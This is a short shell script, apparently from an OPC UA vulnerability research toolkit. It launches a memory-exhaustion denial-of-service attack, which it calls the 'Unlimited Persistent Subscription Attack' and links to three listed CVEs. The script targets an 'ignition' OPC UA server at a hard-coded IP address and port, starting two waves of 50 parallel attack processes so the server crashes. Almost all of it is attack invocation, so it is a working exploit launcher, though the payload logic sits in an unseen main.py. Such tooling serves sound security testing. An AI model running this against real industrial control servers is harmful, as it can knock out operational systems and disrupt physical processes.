#!/bin/sh
# Unlimited Persistent Subscription Attack
#   Create many sessions with subscriptions and monitored items without ever deleting the monitored items. Eventually these allocations will consume all the available process memory which will lead to a crash and denial of service condition.
#
# CVEs:
#   - CVE-2022-25897: https://github.com/eclipse/milo/security/advisories/GHSA-fph9-f5r6-vhqf
#   - CVE-2022-24375: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988725
#   - CVE-2022-24298: https://security.snyk.io/vuln/SNYK-UNMANAGED-FREEOPCUAFREEOPCUA-2988720
#

cd ../
source ./venv/bin/activate

IP_ADDR=10.100.233.78

python3 main.py ignition $IP_ADDR 62541 "" sanity

for i in `seq 50`
do
  echo -----$i------
  python3 main.py ignition $IP_ADDR 62541 "" unlimited_condition_refresh &
done

sleep 240

for i in `seq 50`
do
  echo -----$i------
  python3 main.py ignition $IP_ADDR 62541 "" unlimited_condition_refresh &
done
